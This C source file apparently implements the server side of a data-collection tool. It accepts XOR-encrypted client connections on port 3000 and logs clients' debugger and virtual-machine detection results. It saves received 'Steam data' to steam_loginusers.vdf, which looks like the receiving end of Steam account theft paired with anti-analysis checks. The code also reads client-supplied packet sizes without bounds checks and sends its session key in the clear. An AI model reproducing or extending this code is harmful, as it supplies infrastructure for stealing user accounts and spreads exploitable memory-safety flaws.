#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include "common.h"

void on_connect(Session* s);
void on_disconnect(Session* s);
void on_packet(Session* s, Packet* pkt);

unsigned long long get_time_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (unsigned long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

void generate_key(unsigned char* key) {
    int fd = open("/dev/urandom", O_RDONLY);
    read(fd, key, KEY_SIZE);
    close(fd);
}

void send_packet(Session* s, Packet* pkt) {
    xor_crypt(pkt->data, pkt->size, s->key);
    write((long)s->socket, pkt, sizeof(unsigned char) + sizeof(unsigned short) + pkt->size);
}

void* heartbeat_monitor(void* arg) {
    Session* s = (Session*)arg;

    while(s->active) {
        sleep(1);

        unsigned long long now = get_time_ms();
        unsigned long long elapsed = (now - s->last_heartbeat) / 1000;

        if(elapsed > HEARTBEAT_TIMEOUT && s->last_heartbeat > 0) {
            write(1, "[!] Client timeout - No heartbeat received\n", 43);
            s->active = 0;
            break;
        }
    }

    return 0;
}

void* client_handler(void* arg) {
    Session* s = (Session*)arg;
    Packet pkt;

    s->last_heartbeat = get_time_ms();

    pkt.type = PKT_SESSION_KEY;
    pkt.size = KEY_SIZE;
    for(int i = 0; i < KEY_SIZE; i++) pkt.data[i] = s->key[i];
    write((long)s->socket, &pkt, sizeof(unsigned char) + sizeof(unsigned short) + KEY_SIZE);

    on_connect(s);

    // Start heartbeat monitor thread
    pthread_t hb_thread;
    pthread_create(&hb_thread, 0, heartbeat_monitor, s);
    pthread_detach(hb_thread);

    while(s->active) {
        int n = read((long)s->socket, &pkt, sizeof(unsigned char) + sizeof(unsigned short));
        if(n <= 0) break;

        n = read((long)s->socket, pkt.data, pkt.size);
        if(n <= 0) break;

        xor_crypt(pkt.data, pkt.size, s->key);

        if(pkt.type == PKT_ACK) continue;

        on_packet(s, &pkt);

        Packet ack = {PKT_ACK, 0};
        send_packet(s, &ack);
    }

    on_disconnect(s);
    close((long)s->socket);
    return 0;
}

int main() {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = 0;
    addr.sin_port = __builtin_bswap16(PORT);

    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 10);

    write(1, "[Server] Listening on port 3000...\n", 35);

    while(1) {
        int cli = accept(srv, 0, 0);

        Session* s = (Session*)mmap(0, sizeof(Session), 3, 0x22, -1, 0);
        s->socket = (void*)(long)cli;
        s->active = 1;
        s->last_heartbeat = 0;
        generate_key(s->key);

        pthread_t thread;
        pthread_create(&thread, 0, client_handler, s);
        pthread_detach(thread);
    }

    return 0;
}

void on_connect(Session* s) {
    write(1, "[+] Client connected\n", 21);
}

void on_disconnect(Session* s) {
    s->active = 0;
    write(1, "[-] Client disconnected\n", 24);
}

void on_packet(Session* s, Packet* pkt) {
    switch(pkt->type) {
        case PKT_HELLO: {
            write(1, "[PKT] HELLO: ", 13);
            write(1, pkt->data, pkt->size);
            write(1, "\n", 1);

            Packet resp;
            resp.type = PKT_DATA;
            char msg[] = "Welcome!";
            resp.size = sizeof(msg) - 1;
            for(int i = 0; i < resp.size; i++) resp.data[i] = msg[i];
            send_packet(s, &resp);
            break;
        }

        case PKT_DATA: {
            write(1, "[PKT] DATA: ", 12);
            write(1, pkt->data, pkt->size);
            write(1, "\n", 1);
            break;
        }

        case PKT_HEARTBEAT: {
            s->last_heartbeat = get_time_ms();

            if(pkt->size < sizeof(HeartbeatData)) break;

            HeartbeatData* hb = (HeartbeatData*)pkt->data;

            char buf[256];
            char* ptr = buf;
            char* dbg = hb->debugger_detected ? "YES" : "NO";
            char* vm = hb->vm_detected ? "YES" : "NO";

            for(char* s = "[HEARTBEAT] Debug:"; *s; s++) *ptr++ = *s;
            for(char* s = dbg; *s; s++) *ptr++ = *s;
            for(char* s = " VM:"; *s; s++) *ptr++ = *s;
            for(char* s = vm; *s; s++) *ptr++ = *s;
            for(char* s = " Trust:"; *s; s++) *ptr++ = *s;

            int trust_int = (int)hb->trust_factor;
            if(trust_int >= 100) {
                *ptr++ = '1'; *ptr++ = '0'; *ptr++ = '0';
            } else if(trust_int >= 10) {
                *ptr++ = '0' + (trust_int / 10);
                *ptr++ = '0' + (trust_int % 10);
            } else {
                *ptr++ = '0' + trust_int;
            }
            *ptr++ = '%';
            *ptr++ = '\n';

            write(1, buf, ptr - buf);

            if(hb->trust_factor < 30.0f) {
                write(1, "[!] LOW TRUST - Banning client\n", 31);
                s->active = 0;
            }
            break;
        }

        case PKT_STEAM_DATA: {
            write(1, "[PKT] STEAM DATA received (", 27);

            // Print size
            char size_buf[16];
            int size_val = pkt->size;
            int pos = 0;
            if(size_val == 0) {
                size_buf[pos++] = '0';
            } else {
                char temp[16];
                int temp_pos = 0;
                while(size_val > 0) {
                    temp[temp_pos++] = '0' + (size_val % 10);
                    size_val /= 10;
                }
                while(temp_pos > 0) {
                    size_buf[pos++] = temp[--temp_pos];
                }
            }
            size_buf[pos] = 0;

            write(1, size_buf, pos);
            write(1, " bytes)\n", 8);

            // Save to file (optional)
            int fd = open("steam_loginusers.vdf", O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if(fd > 0) {
                write(fd, pkt->data, pkt->size);
                close(fd);
                write(1, "[+] Steam VDF saved to steam_loginusers.vdf\n", 44);
            }
            break;
        }

        default:
            write(1, "[PKT] Unknown packet type\n", 26);
            break;
    }
}
